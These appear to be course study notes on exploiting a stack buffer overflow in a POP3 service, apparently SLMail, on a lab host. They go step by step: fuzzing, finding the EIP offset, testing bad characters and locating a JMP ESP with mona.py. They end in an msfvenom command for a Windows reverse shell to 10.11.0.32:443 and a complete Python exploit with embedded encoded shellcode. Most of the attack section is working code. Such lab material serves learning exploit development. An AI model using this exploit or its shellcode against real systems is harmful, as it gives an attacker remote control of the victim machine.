## Buffer Overflows 

Page 146 in Manual

Useful Guide:
http://www.primalsecurity.net/0x0-exploit-tutorial-buffer-overflow-vanilla-eip-overwrite-2/

#### fuzzing.py 
This is desigend to crash a service in order to try to overwrite the EIP register

```
#!/usr/bin/python
import socket

buffer=["A"]
counter=100

while len(buffer) <=30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing Pass with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(("10.11.8.145", 110))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send("PASS " + string + "\r\n")
	s.send("QUIT\r\n")
	s.close()
```


#### Pattern Create

Create a unique string of length 2700.  This is to identify the specific location for the next stages.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
```

Place it into this script:

```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"


try:

	print "\nSending evil buffer..."
	s.connect(('10.11.8.145',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."

except:

	print "Could not connect to POP3!"


```


#### Pattern Offset

After running this, note the EIP hex bytes, in this cas 39 69 44 38, then do:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
```

Running this will output put something like this:

```
[*] Exact match at offset 2606
```

Change the script made above, to the below.  This will write tons of A's up to the point of the EIP. Then it will write 4 B's in to the register, and the C's will fill up memory after this point. This will confirm that we have full control over the EIP and what goes inside it.

```
buffer = "A" * 2606 + "B" * 4 + "C" * 90
```


#### Finding Space for our Shellcode

Locate the area in memory which the Stack Pointer is pointing towards.  This should contain lots of C's from our previous crash.  A reverse shell usually is around 350-400 bytes.  Check if we have space for this.  

If not then replicate the crash again, however try to increase the buffer, in this case to 3500.  

```
buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
```

The purpose here is that, all A's will fill up to the start of the EIP register.  Then 4xB will fill the EIP.  The rest of memory will be filled with C's.  In this case, 3500 - the space of all the A's, and minus 4 for the B's.  That will mean our buffer is 3500 bytes.



#### Checking for Bad Characters

Some characters should be avoided, such as:

0x00 Null Byte
0x0a Line Feed
0x0d Carriage Return

These have special meanings, such as termination of a string, end of password, etc... 

To check for other bad characters, we can send a buffer including all possible options to see if any cause issues.  This can be done using this script:

```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer="A"*2606 + "B"*4 + badchars

try:
	print "\nSending evil buffer..."
	s.connect(('10.11.8.145',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
	print "\nDone!"
except:
	print "Could not connect to POP3!"

```


#### Redirecting Execution Flow

We now need to find a way to redirect the execution flow to our own code in memory.  We can't replace the B's in the EIP with the ESP value as this changes on each crash.  This is because each time the service starts it has a different memory allocation pool.

We can use the **JMP ESP** instruction to redirect to our shellcode in memory.  

We will use the Immunity Debugger script - **mona.py** in order to identify modules where we can search for a JMP ESP command.  

The modules we choose must meet the following criteria:

1. No DEP or ASLR protections
2. Has a memory range that does not contain bad characters


```
!mona modules
```

This will show the modules available to us.  


```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm> jmp esp00000000 FFE4 jmp esp
nasm >
```

This has shown us that the op code for the JMP ESP instruction is hex FFE4.

Now we can search within the selected DLL or module for the op code:

```
!mona find -s "\xff\xe4" -m slmfc.dll
```

Note that if there's no DLL's that are available, then try to locate JMP ESP instructions within the current program itself:

```
!mona jmp -r esp
```

From the results pick one that does not have any bad characters.  Note the address on the left side. 

Update the script to show this address - **REMEMBER** to flip the address to little endian.  So in this case, our address is 5F4A358F and is flipped to reverse as shown below.

```
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
```





```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.32 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

#### Final Code

```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xbf\x4f\xa3\x38\x1f\xd9\xeb\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x7d\x12\x83\xc5\x04\x03\x32\xad\xda\xea\x30\x59\x98"
"\x15\xc8\x9a\xfd\x9c\x2d\xab\x3d\xfa\x26\x9c\x8d\x88\x6a\x11"
"\x65\xdc\x9e\xa2\x0b\xc9\x91\x03\xa1\x2f\x9c\x94\x9a\x0c\xbf"
"\x16\xe1\x40\x1f\x26\x2a\x95\x5e\x6f\x57\x54\x32\x38\x13\xcb"
"\xa2\x4d\x69\xd0\x49\x1d\x7f\x50\xae\xd6\x7e\x71\x61\x6c\xd9"
"\x51\x80\xa1\x51\xd8\x9a\xa6\x5c\x92\x11\x1c\x2a\x25\xf3\x6c"
"\xd3\x8a\x3a\x41\x26\xd2\x7b\x66\xd9\xa1\x75\x94\x64\xb2\x42"
"\xe6\xb2\x37\x50\x40\x30\xef\xbc\x70\x95\x76\x37\x7e\x52\xfc"
"\x1f\x63\x65\xd1\x14\x9f\xee\xd4\xfa\x29\xb4\xf2\xde\x72\x6e"
"\x9a\x47\xdf\xc1\xa3\x97\x80\xbe\x01\xdc\x2d\xaa\x3b\xbf\x39"
"\x1f\x76\x3f\xba\x37\x01\x4c\x88\x98\xb9\xda\xa0\x51\x64\x1d"
"\xc6\x4b\xd0\xb1\x39\x74\x21\x98\xfd\x20\x71\xb2\xd4\x48\x1a"
"\x42\xd8\x9c\x8d\x12\x76\x4f\x6e\xc2\x36\x3f\x06\x08\xb9\x60"
"\x36\x33\x13\x09\xdd\xce\xf4\x3c\x29\xd0\x24\x29\x2f\xd0\x25"
"\x12\xa6\x36\x4f\x74\xef\xe1\xf8\xed\xaa\x79\x98\xf2\x60\x04"
"\x9a\x79\x87\xf9\x55\x8a\xe2\xe9\x02\x7a\xb9\x53\x84\x85\x17"
"\xfb\x4a\x17\xfc\xfb\x05\x04\xab\xac\x42\xfa\xa2\x38\x7f\xa5"
"\x1c\x5e\x82\x33\x66\xda\x59\x80\x69\xe3\x2c\xbc\x4d\xf3\xe8"
"\x3d\xca\xa7\xa4\x6b\x84\x11\x03\xc2\x66\xcb\xdd\xb9\x20\x9b"
"\x98\xf1\xf2\xdd\xa4\xdf\x84\x01\x14\xb6\xd0\x3e\x99\x5e\xd5"
"\x47\xc7\xfe\x1a\x92\x43\x0e\x51\xbe\xe2\x87\x3c\x2b\xb7\xc5"
"\xbe\x86\xf4\xf3\x3c\x22\x85\x07\x5c\x47\x80\x4c\xda\xb4\xf8"
"\xdd\x8f\xba\xaf\xde\x85")


buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode


try:

	print "\nSending evil buffer..."
	s.connect(('10.11.8.145',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."

except:

	print "Could not connect to POP3!"

```
